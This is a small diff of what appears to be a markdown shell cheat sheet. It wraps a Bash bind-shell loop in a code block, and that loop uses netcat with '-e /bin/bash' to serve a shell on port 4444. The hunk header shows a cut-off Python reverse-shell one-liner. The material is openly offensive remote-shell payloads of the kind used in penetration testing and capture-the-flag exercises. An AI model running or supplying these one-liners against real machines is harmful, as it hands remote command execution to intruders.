@@ -34,7 +34,9 @@ python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOC
 
 ### Bash
 
+```
 port=4444; if [$# -eq 1]; then port=$1; fi; while true; do nc -lp $port -e /bin/bash;wait; done
+```
 
 ### Telnet
 
